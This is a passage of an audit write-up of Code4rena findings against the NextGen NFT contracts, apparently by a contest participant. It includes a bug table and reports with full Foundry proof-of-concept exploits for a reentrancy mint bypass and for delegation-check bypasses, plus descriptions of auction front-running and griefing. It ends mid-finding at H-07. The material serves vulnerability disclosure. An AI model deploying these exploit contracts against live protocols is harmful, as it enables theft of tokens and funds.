# Leaderboard
[NextGen Contest](https://code4rena.com/contests/2023-10-nextgen#top) 
<br>

`Rank 12 / 195`

# Audited Code Repo
### [Code4rena: nextgen](https://github.com/code-423n4/2023-10-nextgen/commit/71d055b623b0d027886f1799739b7f785b5bc7cd)

<br>

# Bugs Filed & Their Status

| # | Bug ID | Name | URL | Adjudged Status |
|--------|--------|------|:------:|-----------------:|
| 1 | [H-01](#h-01)    | Reentrancy allows attacker to mint more than `maxCollectionPurchases` or max-allowance | [186](https://github.com/code-423n4/2023-10-nextgen-findings/issues/186) | Accepted as High |
| 2 | [H-02](#h-02)    | Delegation address is able to mint tokenIDs it has not been given powers for | [576](https://github.com/code-423n4/2023-10-nextgen-findings/issues/576) | QA |
| 3 | [H-03](#h-03)    | Delegation address is able to mint tokens even after the expiry time-window has passed | [577](https://github.com/code-423n4/2023-10-nextgen-findings/issues/577) | QA |
| 4 | [H-04](#h-04)    | Incorrect winner can be declared in `claimAuction()` due to wrong check inside `require` | [676](https://github.com/code-423n4/2023-10-nextgen-findings/issues/676) | Accepted as Medium |
| 5 | [H-05](#h-05)    | Malicious user can always front-run other bids in `participateToAuction()` to win the auction | [682](https://github.com/code-423n4/2023-10-nextgen-findings/issues/682) | QA |
| 6 | [H-06](#h-06)    | Malicious user can grief the auction process to ensure no successful bids can be entered | [692](https://github.com/code-423n4/2023-10-nextgen-findings/issues/692) | Accepted as High |
| 7 | [H-07](#h-07)    | DoS attack on `returnHighestBid()` is possible via `participateToAuction()` | [695](https://github.com/code-423n4/2023-10-nextgen-findings/issues/695) | Invalidated (Out of Scope) |
| 8 | [H-08](#h-08)    | If transfer of funds fails due to any reason inside `claimAuction()`, they can't be claimed again | [708](https://github.com/code-423n4/2023-10-nextgen-findings/issues/708) | Invalidated (Out of Scope) |
| 9 | [H-09](#h-09)    | Attacker can exploit reentrancy vulnerability to get ownership of auctioned token for free | [725](https://github.com/code-423n4/2023-10-nextgen-findings/issues/725) | Accepted as High |
| 10 | [H-10](#h-10)   | Malicious loser of an auction can make the protocol refund twice the amount he bid via reentrancy attack | [730](https://github.com/code-423n4/2023-10-nextgen-findings/issues/730) | Aceepted as High |
| 11 | [H-11](#h-11)   | Incorrect `Linear Descending Sale Price` calculation by `getPrice()` causes loss of funds for the protocol | [845](https://github.com/code-423n4/2023-10-nextgen-findings/issues/845) | Accepted as Medium |
| 12 | [H-12](#h-12)   | `Periodic Sales` Model's `timePeriod` constraint is not implemented correctly | [987](https://github.com/code-423n4/2023-10-nextgen-findings/issues/987) | Invalidated |
| 13 | [H-13](#h-13)   | Protocol will never be able to mint if integrated with `RandomizerRNG` and has `RNGCost > 0`, due to incorrect implementation of `calculateTokenHash()` | [998](https://github.com/code-423n4/2023-10-nextgen-findings/issues/998) | Invalidated |
| 14 | [M-01](#m-01)    | Excess ether never returned to the user and is taken by the artist & the protocol | [252](https://github.com/sherlock-audit/2023-09-ajna-t0x1cC0de/issues/252) | Invalidated (Out of Scope) |
| 15 | [M-02](#m-02)    | Phase2 minter can not mint if timeline overlaps with Phase1 | [255](https://github.com/sherlock-audit/2023-09-ajna-t0x1cC0de/issues/255) | QA |
| 16 | [M-03](#m-03)    | `allowList` user can't claim his unused allowance quota once Phase2 starts | [256](https://github.com/code-423n4/2023-10-nextgen-findings/issues/231) | Invalidated |
| 17 | [M-04](#m-04)    | For small value of `royalties`, dust amount is left behind which should be paid out | [640](https://github.com/code-423n4/2023-10-nextgen-findings/issues/640) | Invalidated |
| 18 | [M-05](#m-05)    | `maxCollectionPurchases` constraint set via `setCollectionData()` is not respected by `mintAndAuction()` | [782](https://github.com/code-423n4/2023-10-nextgen-findings/issues/782) | Invalidated |
| 19 | [M-06](#m-06)    | `mintAndAuction()` allows to mint tokens even after `allowlistEndTime` and `publicEndTime` | [787](https://github.com/code-423n4/2023-10-nextgen-findings/issues/787) | Invalidated |
| 20 | [M-07](#m-07)    | Division before multiplication causes possible loss of precision in `getPrice()` | [788](https://github.com/code-423n4/2023-10-nextgen-findings/issues/788) | Invalidated (Out of Scope) |
| 21 | [M-08](#m-08)    | Incorrect returned value from `getPrice()` for `salesOption = 2` if `block.timestamp = publicEndTime` | [837](https://github.com/code-423n4/2023-10-nextgen-findings/issues/837) | Accepted as Medium |
| 22 | [M-09](#m-09)    | All the parameters chosen are bad sources of randomness and are deterministic | [1564](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1564) | Invalidated |
| 23 | [M-10](#m-10)    | `airDropTokens()` fails for all if any of the recipients does not implement `onERC721Received` | [1578](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1578) | Invalidated |


<br>

## **HIGH-SEVERITY BUGS**
---

### <a id="h-01"></a>[H-01]
## **Reentrancy allows attacker to mint more than `maxCollectionPurchases` or max-allowance**
#### https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/MinterContract.sol#L236
#### https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/NextGenCore.sol#L193-L198
<br>

## Impact
Since `tokensMintedPerAddress[_collectionID][_mintingAddress]` is updated after [_mintProcessing()](https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/NextGenCore.sol#L193-L198), and there is no reentrancy guard, attacker can mint more tokens than the allowed limit of `maxCollectionPurchases`.<br>
**All the token supply available in Phase2 (public phase) can be taken by a single attacker contract.**
<br>

Note: Similar pattern & vulnerability exists in other functions of `NextGenCore.sol` where Checks-Effects-Interactions is not followed. For example, in [airDropTokens()](https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/NextGenCore.sol#L178), [burnToMint()](https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/NextGenCore.sol#L213), [burn()](https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/NextGenCore.sol#L204) etc. which eventually call `_mintProcessing()` and result in reentrancy vulnerability.

## Proof of Concept
- Install foundry and run `forge init --no-git --force` from root folder (`2023-10-nextgen/`).
- Paste the following code inside a new file `2023-10-nextgen/test/t0x1cReentrancyInMint.t.sol`.
- Run via `forge test --mt test_t0x1cReentrancyInMint -vv`

```js
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import {Test, console} from "forge-std/Test.sol";
import {DelegationManagementContract} from "../smart-contracts/NFTdelegation.sol";
import {randomPool} from "../smart-contracts/XRandoms.sol";
import {NextGenAdmins} from "../smart-contracts/NextGenAdmins.sol";
import {NextGenCore} from "../smart-contracts/NextGenCore.sol";
import {NextGenRandomizerNXT} from "../smart-contracts/RandomizerNXT.sol";
import {NextGenMinterContract} from "../smart-contracts/MinterContract.sol";

interface IERC721Receiver {
    function onERC721Received(address operator, address from, uint256 tokenId, bytes calldata data)
        external
        returns (bytes4);
}

interface IMinter {
    function mint(
        uint256 _collectionID,
        uint256 _numberOfTokens,
        uint256 _maxAllowance,
        string memory _tokenData,
        address _mintTo,
        bytes32[] calldata merkleProof,
        address _delegator,
        uint256 _saltfun_o
    ) external payable;
}

contract Killer is IERC721Receiver {
    IMinter _minter;
    uint256 private _collectionID;
    string private _tokenData;
    uint256 private _saltfun_o;
    uint256 _callCounter;

    constructor(address minter_) payable {
        _minter = IMinter(minter_);

        _tokenData = '{"tdh": "100"}';
        _collectionID = 1;
        _saltfun_o = 2;
    }

    // write ERC721Receiver implementer
    function onERC721Received(address, address, uint256, bytes memory) public virtual override returns (bytes4) {
        _callCounter++;
        if (_callCounter <= 80) {
            _reenter();
        }

        return IERC721Receiver.onERC721Received.selector;
    }

    function _reenter() internal {
        _minter.mint{value: (1 ether)}(
            _collectionID, 1, 0, _tokenData, address(this), new bytes32[](1), address(0), _saltfun_o
        );
    }
}

contract t0x1cReentrancyInMint is Test {
    address public attacker;
    address public addr1;
    bytes32 public merkleRoot;
    bytes32 public merkleRoot_msgSender;
    bytes32[] public _merkleProof_msgSender;
    string[] public _collectionScript;

    DelegationManagementContract hhDelegation;
    randomPool hhRandoms;
    NextGenAdmins hhAdmin;
    NextGenCore hhCore;
    NextGenRandomizerNXT hhRandomizer;
    NextGenMinterContract hhMinter;

    Killer contractKiller;

    function setUp() public {
        attacker = makeAddr("anyone");
        addr1 = makeAddr("addr1");
        merkleRoot_msgSender = 0x208fae20dc5074374a223a1a825bfc23fbf2c9c88f5b092fa3421d54058170d3; // gives max allowance of 19 tokens in phase1
        _merkleProof_msgSender = new bytes32[](1);
        _merkleProof_msgSender[0] = 0x9200f00000000000000000000000000000000000000000000000000000000001;

        hhDelegation = new DelegationManagementContract();
        hhRandoms = new randomPool();
        hhAdmin = new NextGenAdmins();
        hhCore = new NextGenCore("Next Gen Core", "NEXTGEN", address(hhAdmin));

        // This example uses the NXT Randomizer
        hhRandomizer = new NextGenRandomizerNXT(address(hhRandoms), address(hhAdmin), address(hhCore));

        hhMinter = new NextGenMinterContract(address(hhCore), address(hhDelegation), address(hhAdmin));

        checkIfContractsAreDeployed();

        _collectionScript = new string[](1);
        _collectionScript[0] = "desc";

        vm.deal(attacker, 100 ether);
        vm.deal(addr1, 100 ether);

        contractKiller = new Killer{value: 80 ether}(address(hhMinter));
    }

    function checkIfContractsAreDeployed() public {
        assertNotEq(address(hhAdmin), address(0));
        assertNotEq(address(hhCore), address(0));
        assertNotEq(address(hhDelegation), address(0));
        assertNotEq(address(hhMinter), address(0));
        assertNotEq(address(hhRandomizer), address(0));
        assertNotEq(address(hhRandoms), address(0));
    }

    function test_t0x1cReentrancyInMint() public {
        /// create collection
        hhCore.createCollection(
            "Test Collection 1",
            "Artist 1",
            "For testing",
            "www.test.com",
            "CCO",
            "https://ipfs.io/ipfs/hash/",
            "",
            _collectionScript
        );

        /// register collection admin
        hhAdmin.registerCollectionAdmin(1, addr1, true);

        /// set collection data
        vm.prank(addr1);
        hhCore.setCollectionData(
            1, // collectionID
            addr1, // collectionArtistAddress
            1, // maxCollectionPurchases
            100, // collectionTotalSupply
            1_000 // setFinalSupplyTimeAfterMint
        );

        /// set minter contract
        hhCore.addMinterContract(address(hhMinter));

        /// set randomizer contracts
        hhCore.addRandomizer(1, address(hhRandomizer));

        hhMinter.setCollectionCosts(
            1, // collectionID
            1 ether, // collectionMintCost
            0, // collectionEndMintCost -- does not matter for salesOption 1
            0, // rate -- does not matter for salesOption 1
            0, // timePeriod -- does not matter for salesOption 1
            1, // salesOption
            address(0)
        );

        /// specify the correct merkle root
        merkleRoot = merkleRoot_msgSender;

        hhMinter.setCollectionPhases(
            1, // collectionID
            block.timestamp, // _allowlistStartTime
            block.timestamp + 1 days, // _allowlistEndTime
            block.timestamp + 1 days + 1, // _publicStartTime
            block.timestamp + 2 days, // _publicEndTime
            merkleRoot
        );

        /// minting
        vm.prank(addr1);
        hhMinter.mint{value: (19 ether)}(
            1, // collectionID
            19, // numberOfTokens
            19, // maxAllowance -- has to exactly match merkle root's value
            '{"tdh": "100"}', // tokenData
            addr1, // mintTo
            _merkleProof_msgSender,
            address(0), // no delegator, self-mint
            2 // varg0
        );
        // time for public minting now
        vm.warp(block.timestamp + 1 days + 1);
        vm.prank(attacker);
        vm.expectRevert("Change no of tokens"); // can't mint 80 tokens, only 1 is allowed per address
        hhMinter.mint{value: (1 ether)}(
            1, // collectionID
            80, // numberOfTokens
            0, // maxAllowance -- doesn't matter for public minting
            '{"tdh": "100"}', // tokenData
            address(contractKiller), // mintTo
            new bytes32[](1), // no merkle proof required for public minting
            address(0), // no delegator, self-mint
            2 // varg0
        );

        //====================================================
        //              ATTACK
        //====================================================
        vm.prank(attacker);
        hhMinter.mint{value: (1 ether)}(
            1, // collectionID
            1, // numberOfTokens
            0, // maxAllowance -- doesn't matter for public minting
            '{"tdh": "100"}', // tokenData
            address(contractKiller), // mintTo
            new bytes32[](1), // no merkle proof required for public minting
            address(0), // no delegator, self-mint
            2 // varg0
        );

        // contractKiller now has 80 tokens
        assertEq(
            hhCore.retrieveTokensMintedPublicPerAddress(1, address(contractKiller)), 80, "attack wasn't successful"
        );
        // attacker has 1 tokens
        assertEq(hhCore.retrieveTokensMintedPublicPerAddress(1, attacker), 1);

        // @audit-issue : Apart from the 19 tokens minted in phase1, everything available in phase2 was taken by attackers bypassing the allowed limit per address.
    }
}
```


## Tools Used
Foundry.

## Recommended Mitigation Steps
Add reentrancy guards on functions like [NextGenCore::mint()](https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/NextGenCore.sol#L189), [MinterContract::mint()](https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/MinterContract.sol#L196) and others.

---

### <a id="h-02"></a>[H-02]
## **Delegation address is able to mint tokenIDs it has not been given powers for**
#### https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/MinterContract.sol#L207-L209
<br>

## Impact
An artist can delegate his minting rights to a `delAddress`. He can specify the collection id and the token id which the `delAddress` is allowed to mint by calling `registerDelegationAddress()`. Example:
```js
        vm.prank(addr1);
        hhDelegation.registerDelegationAddress(
            collection1,
            delAddress,
            block.timestamp + 2 days,
            1, // useCase
            false, // allTokens
            10000000001 // `tokenId` the `delAddress` is allowed to mint
        );
        hhMinter.updateDelegationCollection(1, collection1); // update `delAddress`
```

However, when the `delAddress` calls [mint()](), there is no check to validate if it can mint other tokenIDs. As a result, `delAddress` can mint other tokenIDs too, bypassing its delegation rights. Similar check is lacking [here](https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/MinterContract.sol#L333-L335) in `burnOrSwapExternalToMint()`.

## Proof of Concept
- Install foundry and run `forge init --no-git --force` from root folder (`2023-10-nextgen/`).
- Paste the following code inside a new file `2023-10-nextgen/test/t0x1cDelegateTokenId.t.sol`.
- Run via `forge test --mt test_t0x1cDelegateTokenId -vv`

```js
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import {Test, console} from "forge-std/Test.sol";
import {DelegationManagementContract} from "../smart-contracts/NFTdelegation.sol";
import {randomPool} from "../smart-contracts/XRandoms.sol";
import {NextGenAdmins} from "../smart-contracts/NextGenAdmins.sol";
import {NextGenCore} from "../smart-contracts/NextGenCore.sol";
import {NextGenRandomizerNXT} from "../smart-contracts/RandomizerNXT.sol";
import {NextGenMinterContract} from "../smart-contracts/MinterContract.sol";

contract t0x1cDelegateTokenId is Test {
    address public addr1;
    address public delAddress;
    bytes32 public merkleRoot_delAddress;
    bytes32[] public _merkleProof_delAddress;
    string[] public _collectionScript;

    DelegationManagementContract hhDelegation;
    randomPool hhRandoms;
    NextGenAdmins hhAdmin;
    NextGenCore hhCore;
    NextGenRandomizerNXT hhRandomizer;
    NextGenMinterContract hhMinter;

    address constant ALL_COLLECTIONS = 0x8888888888888888888888888888888888888888;

    function setUp() public {
        addr1 = makeAddr("addr1");
        delAddress = makeAddr("delegatedAddress");

        merkleRoot_delAddress = 0xa7ba7fa301a6ea479bfc93bc5195f11092687ee4057cfb6444f5663245616526; // max allowance of 5
        _merkleProof_delAddress = new bytes32[](1);
        _merkleProof_delAddress[0] = 0x9200f00000000000000000000000000000000000000000000000000000000002;

        hhDelegation = new DelegationManagementContract();
        hhRandoms = new randomPool();
        hhAdmin = new NextGenAdmins();
        hhCore = new NextGenCore("Next Gen Core", "NEXTGEN", address(hhAdmin));

        // This example uses the NXT Randomizer
        hhRandomizer = new NextGenRandomizerNXT(address(hhRandoms), address(hhAdmin), address(hhCore));

        hhMinter = new NextGenMinterContract(address(hhCore), address(hhDelegation), address(hhAdmin));

        checkIfContractsAreDeployed();

        _collectionScript = new string[](1);
        _collectionScript[0] = "desc";
    }

    function checkIfContractsAreDeployed() public {
        assertNotEq(address(hhAdmin), address(0));
        assertNotEq(address(hhCore), address(0));
        assertNotEq(address(hhDelegation), address(0));
        assertNotEq(address(hhMinter), address(0));
        assertNotEq(address(hhRandomizer), address(0));
        assertNotEq(address(hhRandoms), address(0));
    }

    function test_t0x1cDelegateTokenId() public {
        /// create collection
        hhCore.createCollection(
            "Test Collection 1",
            "Artist 1",
            "For testing",
            "www.test.com",
            "CCO",
            "https://ipfs.io/ipfs/hash/",
            "",
            _collectionScript
        );

        /// register collection admin
        hhAdmin.registerCollectionAdmin(1, addr1, true);

        /// set collection data
        vm.prank(addr1);
        hhCore.setCollectionData(
            1, // collectionID
            addr1, // collectionArtistAddress
            2, // maxCollectionPurchases
            10_000, // collectionTotalSupply
            0 // setFinalSupplyTimeAfterMint
        );

        /// set minter contract
        hhCore.addMinterContract(address(hhMinter));

        /// set randomizer contracts
        hhCore.addRandomizer(1, address(hhRandomizer));

        /// set collection costs & phases
        hhMinter.setCollectionCosts(
            1, // collectionID
            0, // collectionMintCost
            0, // collectionEndMintCost
            0, // rate
            0, // timePeriod
            1, // salesOption
            delAddress
        );

        /// register delegation address
        address collection1 = makeAddr("col1"); // @audit-info : let's assume an address where collection1 got deployed(created)

        vm.prank(addr1);
        hhDelegation.registerDelegationAddress(
            collection1,
            delAddress,
            block.timestamp + 2 days,
            1, // useCase
            false, // can't mint allTokens
            10000000001 // `tokenId` the `delAddress` is allowed to mint
        );
        hhMinter.updateDelegationCollection(1, collection1); // update `delAddress`

        /// set collection phases
        hhMinter.setCollectionPhases(
            1, // collectionID
            block.timestamp, // _allowlistStartTime
            block.timestamp + 1 days, // _allowlistEndTime
            block.timestamp + 2 days, // _publicStartTime
            block.timestamp + 3 days, // _publicEndTime
            merkleRoot_delAddress
        );

        /// minting
        vm.prank(delAddress);
        hhMinter.mint(
            1, // collectionID
            4, // numberOfTokens
            5, // maxAllowance for delegator
            '{"tdh": "100"}', // tokenData
            addr1, // mintTo
            _merkleProof_delAddress,
            addr1, // delegator
            2 // varg0
        );

        // @audit-issue : delAddress could mint 4 tokens in spite of having approval for only token id 10000000001
        assertEq(hhCore.retrieveTokensMintedALPerAddress(1, addr1), 4, "delegator could not mint 4 tokens");
    }
}
```

## Tools Used
Foundry.

## Recommended Mitigation Steps
Instead of relying on `retrieveGlobalStatusOfDelegation` [here](https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/MinterContract.sol#L207-L209), modify it along the lines of `retrieveDelegationAddressesTokensIDsandExpiredDates(addr1, collection1, 1)` which returns an array of active delegations along with approved tokenIDs and then match that.

---

### <a id="h-03"></a>[H-03]
## **Delegation address is able to mint tokens even after the expiry time-window has passed**
#### https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/MinterContract.sol#L207-L209
<br>

## Impact
An artist can delegate his minting rights to a `delAddress` by calling `registerDelegationAddress()`. He can specify the collection id and the expiry time window after which the `delAddress` is not allowed to mint tokens. Example:
```js
        vm.prank(addr1);
        hhDelegation.registerDelegationAddress(
            ALL_COLLECTIONS,
            delAddress,
            block.timestamp + 1 days, // @audit-info : delegated rights should expire after 1 day
            1, // useCase
            true, // allTokens
            0
        );
```

However, when the `delAddress` calls [mint()](), there is no check to validate if it is still within the expiry window. This allows `delAddress` to bypass its delegation rights. `burnOrSwapExternalToMint()` lacks [this check too](https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/MinterContract.sol#L333-L335).

## Proof of Concept
- Install foundry and run `forge init --no-git --force` from root folder (`2023-10-nextgen/`).
- Paste the following code inside a new file `2023-10-nextgen/test/t0x1cDelegateExpiryWindow.t.sol`.
- Run via `forge test --mt test_t0x1cDelegateExpiryWindow -vv`

```js
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import {Test, console} from "forge-std/Test.sol";
import {DelegationManagementContract} from "../smart-contracts/NFTdelegation.sol";
import {randomPool} from "../smart-contracts/XRandoms.sol";
import {NextGenAdmins} from "../smart-contracts/NextGenAdmins.sol";
import {NextGenCore} from "../smart-contracts/NextGenCore.sol";
import {NextGenRandomizerNXT} from "../smart-contracts/RandomizerNXT.sol";
import {NextGenMinterContract} from "../smart-contracts/MinterContract.sol";

contract t0x1cDelegateExpiryWindow is Test {
    address public addr1;
    address public delAddress;
    bytes32 public merkleRoot_delAddress;
    bytes32[] public _merkleProof_delAddress;
    string[] public _collectionScript;

    DelegationManagementContract hhDelegation;
    randomPool hhRandoms;
    NextGenAdmins hhAdmin;
    NextGenCore hhCore;
    NextGenRandomizerNXT hhRandomizer;
    NextGenMinterContract hhMinter;

    address constant ALL_COLLECTIONS = 0x8888888888888888888888888888888888888888;

    function setUp() public {
        addr1 = makeAddr("addr1");
        delAddress = makeAddr("delegatedAddress");

        merkleRoot_delAddress = 0xa7ba7fa301a6ea479bfc93bc5195f11092687ee4057cfb6444f5663245616526; // max allowance of 5
        _merkleProof_delAddress = new bytes32[](1);
        _merkleProof_delAddress[0] = 0x9200f00000000000000000000000000000000000000000000000000000000002;

        hhDelegation = new DelegationManagementContract();
        hhRandoms = new randomPool();
        hhAdmin = new NextGenAdmins();
        hhCore = new NextGenCore("Next Gen Core", "NEXTGEN", address(hhAdmin));

        // This example uses the NXT Randomizer
        hhRandomizer = new NextGenRandomizerNXT(address(hhRandoms), address(hhAdmin), address(hhCore));

        hhMinter = new NextGenMinterContract(address(hhCore), address(hhDelegation), address(hhAdmin));

        checkIfContractsAreDeployed();

        _collectionScript = new string[](1);
        _collectionScript[0] = "desc";
    }

    function checkIfContractsAreDeployed() public {
        assertNotEq(address(hhAdmin), address(0));
        assertNotEq(address(hhCore), address(0));
        assertNotEq(address(hhDelegation), address(0));
        assertNotEq(address(hhMinter), address(0));
        assertNotEq(address(hhRandomizer), address(0));
        assertNotEq(address(hhRandoms), address(0));
    }

    function test_t0x1cDelegateExpiryWindow() public {
        /// create collection
        hhCore.createCollection(
            "Test Collection 1",
            "Artist 1",
            "For testing",
            "www.test.com",
            "CCO",
            "https://ipfs.io/ipfs/hash/",
            "",
            _collectionScript
        );

        /// register collection admin
        hhAdmin.registerCollectionAdmin(1, addr1, true);

        /// set collection data
        vm.prank(addr1);
        hhCore.setCollectionData(
            1, // collectionID
            addr1, // collectionArtistAddress
            2, // maxCollectionPurchases
            10_000, // collectionTotalSupply
            0 // setFinalSupplyTimeAfterMint
        );

        /// set minter contract
        hhCore.addMinterContract(address(hhMinter));

        /// set randomizer contracts
        hhCore.addRandomizer(1, address(hhRandomizer));

        /// set collection costs & phases
        hhMinter.setCollectionCosts(
            1, // collectionID
            0, // collectionMintCost
            0, // collectionEndMintCost
            0, // rate
            0, // timePeriod
            1, // salesOption
            delAddress
        );

        /// register delegation address
        vm.prank(addr1);
        hhDelegation.registerDelegationAddress(
            ALL_COLLECTIONS,
            delAddress,
            block.timestamp + 1 days, // @audit-info : delegated rights should expire after 1 day
            1, // useCase
            true, // allTokens
            0
        );

        /// set collection phases
        hhMinter.setCollectionPhases(
            1, // collectionID
            block.timestamp, // _allowlistStartTime
            block.timestamp + 3 days, // _allowlistEndTime
            block.timestamp + 4 days, // _publicStartTime
            block.timestamp + 5 days, // _publicEndTime
            merkleRoot_delAddress
        );

        /// minting
        vm.warp(block.timestamp + 2 days); // @audit-info : jump 2 days (exceeding delegation expiry time-window)
        vm.prank(delAddress);
        hhMinter.mint(
            1, // collectionID
            5, // numberOfTokens
            5, // maxAllowance for delegator
            '{"tdh": "100"}', // tokenData
            addr1, // mintTo
            _merkleProof_delAddress,
            addr1, // delegator
            2 // varg0
        );

        // @audit-issue : delAddress could mint 5 tokens even after his delegation time-window expired
        assertEq(hhCore.retrieveTokensMintedALPerAddress(1, addr1), 5, "delegator could not mint tokens");
    }
}
```

## Tools Used
Foundry.

## Recommended Mitigation Steps
Instead of relying on `retrieveGlobalStatusOfDelegation` [here](https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/MinterContract.sol#L207-L209), modify it to use `retrieveDelegationAddressesTokensIDsandExpiredDates(addr1, ALL_COLLECTIONS, 1)` which returns an array of active delegations along with expiry timestamps and then compare with that.

---

### <a id="h-04"></a>[H-04]
## **Incorrect winner can be declared in `claimAuction()` due to wrong check inside `require`**
#### https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/AuctionDemo.sol#L105
<br>

## Impact
Any bids placed at timestamp equal to `minter.getAuctionEndTime(_tokenid)` via [participateToAuction()](https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/AuctionDemo.sol#L58) run the risk of getting front-run by [claimAuction()](https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/AuctionDemo.sol#L105) called at the same timestamp, and effectively not considering any of these bids thus paying the winning amount to an incorrect winner.

## Proof of Concept
`participateToAuction()` [allows particpation till end of auction time](https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/AuctionDemo.sol#L58) (inclusive, as expected) via a `<=` comparison inside `require` which says  `&& block.timestamp <= minter.getAuctionEndTime(_tokenid)`. So, the highest bidder could come into picture at timestamp `minter.getAuctionEndTime(_tokenid)`.
<br>

However, [claimAuction()](https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/AuctionDemo.sol#L105) has a `require` which checks: `require(block.timestamp >= minter.getAuctionEndTime(_tokenid)` using `>=` instead of using a `>`, which means that someone bidding at timestamp `minter.getAuctionEndTime(_tokenid)`, who could have been the highest bidder, can be excluded from the check of [returnHighestBidder()](https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/AuctionDemo.sol#L87) which is called by claimAuction's modifier [WinnerOrAdminRequired](https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/AuctionDemo.sol#L31). This can happen if this last bidder's transaction is ordered after the claimAuction transaction which the so-far-highest-bidder has chosen to call at timestamp equal to `minter.getAuctionEndTime(_tokenid)`. <br>
Note that the so-far-highest-bidder can also plan this maliciously by paying a higher gas fee and making sure call to claimAuction is executed first in the mempool.

## Tools Used
Manual inspection.

## Recommended Mitigation Steps
Make the following change:

```diff
File: smart-contracts/AuctionDemo.sol#L105

-   require(block.timestamp >= minter.getAuctionEndTime(_tokenid) && auctionClaim[_tokenid] == false && minter.getAuctionStatus(_tokenid) == true);
+   require(block.timestamp > minter.getAuctionEndTime(_tokenid) && auctionClaim[_tokenid] == false && minter.getAuctionStatus(_tokenid) == true);
```

---

### <a id="h-05"></a>[H-05]
## **Malicious user can always front-run other bids in `participateToAuction()` to win the auction**
#### https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/AuctionDemo.sol#L57-L61
<br>

## Impact
Unsuspecting bidders trying to call [participateToAuction()](https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/AuctionDemo.sol#L57-L61) with a value higher that the current highest bid will find that their bid is always bettered by a malicious attacker, who ultimately wins the auction.

## Proof of Concept
There is no front-running protection for [participateToAuction()](https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/AuctionDemo.sol#L57-L61). An attacker could monitor the mempool and wait for the highest bid to appear there. He can then front run it with `that value + 1 wei` and become the highest bidder. He can continue doing so repeatedly whenever a new bid is seen in the mempool. Just before the auction ends, he cancels all his bids except the highest one. He wins the auction.

## Tools Used
Manual inspection.

## Recommended Mitigation Steps
Consider having the auction in multiple phases. One way could be to implement a _Reveal Phase_ where bids are only considered if they are accompanied by a unique secret. During the bid phase, participants can submit encrypted bids containing the secret. In the reveal phase, participants decrypt and reveal their bids. This prevents front-runners from seeing and outbidding other participants. Another way could be to have some sort of a _Commit-Reveal Scheme_ with a random reveal time span.


---

### <a id="h-06"></a>[H-06]
## **Malicious user can grief the auction process to ensure no successful bids can be entered**
#### https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/AuctionDemo.sol#L57-L61
#### https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/AuctionDemo.sol#L65-L83
<br>

## Impact
Malicious attacker can call [participateToAuction()](https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/AuctionDemo.sol#L57-L61) with a very high bid right at the start of the auction, as the very first bid. He can then cancel it right at the end ensuring no bids are ever logged and hence auction has no winners.
Causes loss of genuine auction bids and hence funds for the protocol. <br>
**Note** that the above impact is also possible during the course of normal user events, without the involvement of a malicious user and is outlined below in the PoC steps.

## Proof of Concept
### PoC-1 (with malicious attacker)
1. Attacker pays a high gas fee (if he has to) and becomes the first one to call [participateToAuction()](https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/AuctionDemo.sol#L57-L61). He makes this call with an exorbitantly high bid value (say, `A ether`).
2. Any subsequent bids equal to or lower to `A ether` are never entered into the `auctionInfoData[_tokenid]` array due to [this check](https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/AuctionDemo.sol#L58). 
3. If an even higher bid is placed by someone else, Attacker can choose to front-run it.
4. Right before the end of the auction, Attacker [cancels his bid](https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/AuctionDemo.sol#L134) and gets all his funds back.
5. Since there are no other bids, [claimAuction()](https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/AuctionDemo.sol#L104) will have no winners.

### PoC-2 (with normal users' flow)
1. Alice places a bid of `10 ETH` recognized as the highest bid so far.
2. Zoey wants to place a bid of `9.5 ETH` but can not as it is lesser than the current highest bid of 10 ETH. His bid is never entered into the system (in the `auctionInfoData[_tokenid]` array).
3. Bob places a new highest bid of `11 ETH`.
4. Both Alice and Bob feel they overbid, so cancel their bids just before the end of the auction. 
5. There is no other bid in the system now even though we had Zoey previously who was willing to pay `9.5 ETH`.

## Tools Used
Manual inspection.

## Recommended Mitigation Steps
Consider storing all the bids in the `auctionInfoData[_tokenid]` array so that if the highest bid is cancelled, subsequent lower ones can be checked. Also, protocol should consider adding a 'cancellation fee' and not return all the funds if a bid is cancelled.

---

### <a id="h-07"></a>[H-07]
## **DoS attack on `returnHighestBid()` is possible via `participateToAuction()`**
#### https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/AuctionDemo.sol#L65-L69
#### https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/AuctionDemo.sol#L57-L61
<br>

## Impact
